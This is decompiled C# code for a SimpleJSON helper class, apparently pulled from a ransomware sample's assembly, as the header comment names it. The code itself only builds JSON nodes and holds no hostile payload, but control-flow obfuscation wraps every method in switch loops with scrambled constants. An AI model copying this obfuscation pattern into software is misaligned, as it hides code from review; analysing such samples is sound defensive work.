// Decompiled with JetBrains decompiler
// Type: SimpleJSON.JSONLazyCreator
// Assembly: AdjustmentRu, Version=2.0.4.0, Culture=neutral, PublicKeyToken=null
// MVID: 295D2DB0-E85F-4EE4-A4D8-BB22DC4EE57D
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.02-msil\HEUR-Trojan-Ransom.MSIL.Blocker.gen-56431be0898e907a3b97e42a4c9d74cbdb487ed8617dcf64fb3a8dddef6dded1.exe

namespace SimpleJSON
{
  internal class JSONLazyCreator : JSONNode
  {
    private JSONNode m_Node = (JSONNode) null;
    private string m_Key = (string) null;

    public JSONLazyCreator(JSONNode aNode)
    {
label_1:
      int num1 = 502634731;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 691967494)) % 5U)
        {
          case 0:
            goto label_3;
          case 1:
            num1 = (int) num2 * -330725357 ^ -657351045;
            continue;
          case 2:
            goto label_1;
          case 3:
            num1 = (int) num2 * 370156144 ^ 255531579;
            continue;
          case 4:
            this.m_Node = aNode;
            this.m_Key = (string) null;
            num1 = (int) num2 * -432813755 ^ -631673057;
            continue;
          default:
            goto label_7;
        }
      }
label_3:
      return;
label_7:;
    }

    public JSONLazyCreator(JSONNode aNode, string aKey)
    {
label_1:
      int num1 = -108719819;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -1836796337)) % 5U)
        {
          case 0:
            this.m_Node = aNode;
            this.m_Key = aKey;
            num1 = (int) num2 * 972906287 ^ -900660113;
            continue;
          case 1:
            num1 = (int) num2 * 1791400038 ^ -146815406;
            continue;
          case 2:
            num1 = (int) num2 * -1143004233 ^ 440111940;
            continue;
          case 3:
            goto label_3;
          case 4:
            goto label_1;
          default:
            goto label_7;
        }
      }
label_3:
      return;
label_7:;
    }

    private void Set(JSONNode aVal)
    {
      if (this.m_Key != null)
        goto label_12;
label_1:
      int num1 = 1179305847;
label_2:
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 1652133661)) % 11U)
        {
          case 0:
            num1 = (int) num2 * 1473559040 ^ 1543287968;
            continue;
          case 1:
            this.m_Node.Add(this.m_Key, aVal);
            num1 = (int) num2 * -1303558697 ^ -1821986340;
            continue;
          case 2:
            goto label_12;
          case 3:
            goto label_1;
          case 4:
            num1 = (int) num2 * -1836190903 ^ 1622741997;
            continue;
          case 5:
            num1 = (int) num2 * -1330270556 ^ -21717845;
            continue;
          case 6:
            this.m_Node.Add(aVal);
            num1 = (int) num2 * 42454256 ^ 1418799108;
            continue;
          case 7:
            num1 = (int) num2 * -170846805 ^ -546711422;
            continue;
          case 8:
            this.m_Node = (JSONNode) null;
            num1 = 817710270;
            continue;
          case 9:
            goto label_3;
          case 10:
            num1 = (int) num2 * -1277373863 ^ 970138025;
            continue;
          default:
            goto label_13;
        }
      }
label_3:
      return;
label_13:
      return;
label_12:
      num1 = 666116379;
      goto label_2;
    }

    public override JSONNode this[int aIndex]
    {
      get
      {
label_1:
        int num1 = 547899562;
        JSONNode jsonNode;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ 244007073)) % 4U)
          {
            case 0:
              num1 = (int) num2 * 1961386708 ^ -940127372;
              continue;
            case 2:
              goto label_1;
            case 3:
              jsonNode = (JSONNode) new JSONLazyCreator((JSONNode) this);
              num1 = (int) num2 * -1140192552 ^ -948167027;
              continue;
            default:
              goto label_5;
          }
        }
label_5:
        return jsonNode;
      }
      set
      {
label_1:
        int num1 = 584283458;
        JSONArray aVal;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ 1916194707)) % 6U)
          {
            case 0:
              goto label_1;
            case 1:
              aVal.Add(value);
              num1 = (int) num2 * -1152528208 ^ -255920020;
              continue;
            case 2:
              this.Set((JSONNode) aVal);
              num1 = (int) num2 * -1469434858 ^ -750205261;
              continue;
            case 3:
              num1 = (int) num2 * 1266180675 ^ -1546156632;
              continue;
            case 4:
              goto label_3;
            case 5:
              aVal = new JSONArray();
              num1 = (int) num2 * 1811971239 ^ 1552122607;
              continue;
            default:
              goto label_8;
          }
        }
label_3:
        return;
label_8:;
      }
    }

    public override JSONNode this[string aKey]
    {
      get
      {
label_1:
        int num1 = 1997328665;
        JSONNode jsonNode;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ 370868535)) % 4U)
          {
            case 0:
              goto label_1;
            case 2:
              jsonNode = (JSONNode) new JSONLazyCreator((JSONNode) this, aKey);
              num1 = (int) num2 * -1658596273 ^ 1605065066;
              continue;
            case 3:
              num1 = (int) num2 * -1058172804 ^ -1919088882;
              continue;
            default:
              goto label_5;
          }
        }
label_5:
        return jsonNode;
      }
      set
      {
        JSONClass aVal = new JSONClass();
label_1:
        int num1 = 738599079;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ 1865121847)) % 6U)
          {
            case 0:
              goto label_1;
            case 1:
              num1 = (int) num2 * -960898245 ^ 1959201465;
              continue;
            case 2:
              aVal.Add(aKey, value);
              num1 = (int) num2 * -453796109 ^ -100688522;
              continue;
            case 3:
              goto label_3;
            case 4:
              this.Set((JSONNode) aVal);
              num1 = (int) num2 * -706100976 ^ 70549060;
              continue;
            case 5:
              num1 = (int) num2 * -19323032 ^ 260749565;
              continue;
            default:
              goto label_8;
          }
        }
label_3:
        return;
label_8:;
      }
    }

    public override void Add(JSONNode aItem)
    {
      JSONArray aVal = new JSONArray();
      aVal.Add(aItem);
      this.Set((JSONNode) aVal);
    }

    public override void Add(string aKey, JSONNode aItem)
    {
label_1:
      int num1 = -1001396217;
      JSONClass aVal;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -756106580)) % 5U)
        {
          case 0:
            goto label_1;
          case 1:
            aVal = new JSONClass();
            aVal.Add(aKey, aItem);
            num1 = (int) num2 * -1133624175 ^ 734070446;
            continue;
          case 2:
            num1 = (int) num2 * -274890438 ^ 1368545399;
            continue;
          case 3:
            this.Set((JSONNode) aVal);
            num1 = (int) num2 * 1479024198 ^ 1205826149;
            continue;
          case 4:
            goto label_3;
          default:
            goto label_7;
        }
      }
label_3:
      return;
label_7:;
    }

    public static bool operator ==(JSONLazyCreator a, object b)
    {
label_1:
      int num1 = 179079281;
      bool flag;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 543266634)) % 6U)
        {
          case 0:
            flag = true;
            num1 = (int) num2 * -1705160907 ^ -266136642;
            continue;
          case 1:
            int num3 = b == null ? 404241624 : (num3 = 956443731);
            num1 = num3 ^ (int) num2 * 1448394382;
            continue;
          case 3:
            num1 = (int) num2 * -1478853426 ^ -1431379388;
            continue;
          case 4:
            goto label_1;
          case 5:
            flag = (object) a == b;
            num1 = 2095433077;
            continue;
          default:
            goto label_7;
        }
      }
label_7:
      return flag;
    }

    public static bool operator !=(JSONLazyCreator a, object b)
    {
      bool flag = !(a == b);
label_1:
      int num1 = -685060436;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -1475973282)) % 3U)
        {
          case 1:
            num1 = (int) num2 * 272007363 ^ -434979374;
            continue;
          case 2:
            goto label_1;
          default:
            goto label_4;
        }
      }
label_4:
      return flag;
    }

    public override bool Equals(object obj)
    {
label_1:
      int num1 = 240354871;
      bool flag;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 777925302)) % 7U)
        {
          case 0:
            goto label_1;
          case 1:
            num1 = (int) num2 * -176117223 ^ -1891538248;
            continue;
          case 2:
            flag = (object) this == obj;
            num1 = 1980699195;
            continue;
          case 3:
            flag = true;
            num1 = (int) num2 * 1577416756 ^ -155060463;
            continue;
          case 4:
            int num3 = obj != null ? -1551545913 : (num3 = -1684076357);
            num1 = num3 ^ (int) num2 * 2116774512;
            continue;
          case 6:
            num1 = (int) num2 * 230688667 ^ -663092628;
            continue;
          default:
            goto label_8;
        }
      }
label_8:
      return flag;
    }

    public override int GetHashCode()
    {
label_1:
      int num1 = -2125701322;
      int hashCode;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -238797283)) % 3U)
        {
          case 1:
            hashCode = base.GetHashCode();
            num1 = (int) num2 * -1119973205 ^ -816214406;
            continue;
          case 2:
            goto label_1;
          default:
            goto label_4;
        }
      }
label_4:
      return hashCode;
    }

    public override string ToString() => "";

    public override string ToString(string aPrefix)
    {
label_1:
      int num1 = 1897974136;
      string str;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 1775617494)) % 4U)
        {
          case 0:
            goto label_1;
          case 1:
            num1 = (int) num2 * -2050367081 ^ 289631186;
            continue;
          case 2:
            str = "";
            num1 = (int) num2 * -1424488496 ^ 588355307;
            continue;
          default:
            goto label_5;
        }
      }
label_5:
      return str;
    }

    public override int AsInt
    {
      get
      {
        this.Set((JSONNode) new JSONData(0));
label_1:
        int num1 = -1707998987;
        int asInt;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ -48954376)) % 4U)
          {
            case 0:
              goto label_1;
            case 1:
              num1 = (int) num2 * 640596766 ^ -1347510688;
              continue;
            case 2:
              asInt = 0;
              num1 = (int) num2 * 1308006246 ^ -828580793;
              continue;
            default:
              goto label_5;
          }
        }
label_5:
        return asInt;
      }
      set
      {
        JSONData aVal = new JSONData(value);
label_1:
        int num1 = -599607412;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ -1084720853)) % 4U)
          {
            case 0:
              goto label_1;
            case 1:
              num1 = (int) num2 * 1150459519 ^ -55011730;
              continue;
            case 2:
              goto label_3;
            case 3:
              this.Set((JSONNode) aVal);
              num1 = (int) num2 * -906163954 ^ 1261537968;
              continue;
            default:
              goto label_6;
          }
        }
label_3:
        return;
label_6:;
      }
    }

    public override float AsFloat
    {
      get
      {
        this.Set((JSONNode) new JSONData(0.0f));
label_1:
        int num1 = -763677017;
        float asFloat;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ -466438020)) % 4U)
          {
            case 0:
              goto label_1;
            case 2:
              num1 = (int) num2 * -853330182 ^ -539041515;
              continue;
            case 3:
              asFloat = 0.0f;
              num1 = (int) num2 * -1635634187 ^ -655954495;
              continue;
            default:
              goto label_5;
          }
        }
label_5:
        return asFloat;
      }
      set
      {
label_1:
        int num1 = 798345875;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ 1232505391)) % 3U)
          {
            case 0:
              goto label_1;
            case 1:
              goto label_3;
            case 2:
              this.Set((JSONNode) new JSONData(value));
              num1 = (int) num2 * 369203942 ^ -226639050;
              continue;
            default:
              goto label_5;
          }
        }
label_3:
        return;
label_5:;
      }
    }

    public override double AsDouble
    {
      get
      {
        JSONData aVal = new JSONData(0.0);
label_1:
        int num1 = -1953484281;
        double asDouble;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ -646623561)) % 3U)
          {
            case 0:
              goto label_1;
            case 2:
              this.Set((JSONNode) aVal);
              asDouble = 0.0;
              num1 = (int) num2 * -2140515865 ^ -601434444;
              continue;
            default:
              goto label_4;
          }
        }
label_4:
        return asDouble;
      }
      set => this.Set((JSONNode) new JSONData(value));
    }

    public override bool AsBool
    {
      get
      {
label_1:
        int num1 = -768718760;
        bool asBool;
        JSONData aVal;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ -1938217225)) % 6U)
          {
            case 0:
              goto label_1;
            case 1:
              aVal = new JSONData(false);
              num1 = (int) num2 * -429875444 ^ -189277396;
              continue;
            case 3:
              this.Set((JSONNode) aVal);
              num1 = (int) num2 * -1002297747 ^ 2040091156;
              continue;
            case 4:
              asBool = false;
              num1 = (int) num2 * -1859440206 ^ -1467989986;
              continue;
            case 5:
              num1 = (int) num2 * 1073071757 ^ -2016437010;
              continue;
            default:
              goto label_7;
          }
        }
label_7:
        return asBool;
      }
      set
      {
label_1:
        int num1 = -1438374214;
        JSONData aVal;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ -1586854049)) % 4U)
          {
            case 0:
              goto label_1;
            case 1:
              aVal = new JSONData(value);
              num1 = (int) num2 * 830483524 ^ 225460553;
              continue;
            case 2:
              this.Set((JSONNode) aVal);
              num1 = (int) num2 * 1140210229 ^ 2097758854;
              continue;
            case 3:
              goto label_3;
            default:
              goto label_6;
          }
        }
label_3:
        return;
label_6:;
      }
    }

    public override JSONArray AsArray
    {
      get
      {
label_1:
        int num1 = 407496626;
        JSONArray aVal;
        JSONArray asArray;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ 656469600)) % 5U)
          {
            case 1:
              this.Set((JSONNode) aVal);
              asArray = aVal;
              num1 = (int) num2 * -264459444 ^ 1756567183;
              continue;
            case 2:
              aVal = new JSONArray();
              num1 = (int) num2 * -1657058872 ^ -157358545;
              continue;
            case 3:
              num1 = (int) num2 * -814894057 ^ -126909399;
              continue;
            case 4:
              goto label_1;
            default:
              goto label_6;
          }
        }
label_6:
        return asArray;
      }
    }

    public override JSONClass AsObject
    {
      get
      {
        JSONClass aVal = new JSONClass();
        this.Set((JSONNode) aVal);
label_1:
        int num1 = 1392315346;
        JSONClass asObject;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ 843657578)) % 3U)
          {
            case 0:
              goto label_1;
            case 2:
              asObject = aVal;
              num1 = (int) num2 * -502661782 ^ -2002345084;
              continue;
            default:
              goto label_4;
          }
        }
label_4:
        return asObject;
      }
    }
  }
}
